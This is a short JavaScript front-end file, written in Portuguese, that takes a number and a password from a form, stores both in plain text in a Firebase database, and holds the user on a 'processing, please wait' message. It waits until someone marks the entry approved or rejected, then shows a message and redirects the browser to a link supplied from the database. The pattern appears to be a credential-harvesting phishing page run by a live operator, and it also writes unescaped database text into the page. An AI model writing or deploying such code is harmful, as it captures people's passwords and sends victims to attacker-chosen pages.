function enviar() {

  const numero = document.getElementById("numero").value;
  const senha = document.getElementById("senha").value;
  const msg = document.getElementById("msg");

  if (!numero || !senha) {
    msg.innerHTML = "Preencha todos os campos.";
    return;
  }

  const dados = {

    numero: numero,
    senha: senha,
    dataHora: new Date().toLocaleString("pt-PT"),

    status: "pendente",

    mensagem: "⏳ Processando requisitos... Por favor, aguarde.",

    link: ""

  };


  const novoRegistro = db.ref("usuarios").push();


  novoRegistro.set(dados)

  .then(() => {


    // Guardar o ID deste pedido no navegador

    localStorage.setItem("pedidoID", novoRegistro.key);


    msg.innerHTML =
    "⏳ Processando requisitos... Por favor, aguarde.";


    acompanharStatus();


  })


  .catch((erro)=>{

    msg.innerHTML =
    "Erro: " + erro.message;

  });


}



function acompanharStatus(){


 const id = localStorage.getItem("pedidoID");


 if(!id){
   return;
 }


 db.ref("usuarios/" + id).on("value",(snapshot)=>{


    const dados = snapshot.val();


    if(!dados){
      return;
    }


    const msg = document.getElementById("msg");


    if(dados.status === "aprovado"){


       msg.innerHTML = dados.mensagem;


       if(dados.link){

          setTimeout(()=>{

             window.location.href = dados.link;

          },3000);

       }


    }



    if(dados.status === "rejeitado"){


       msg.innerHTML = dados.mensagem;


    }



 });


      }
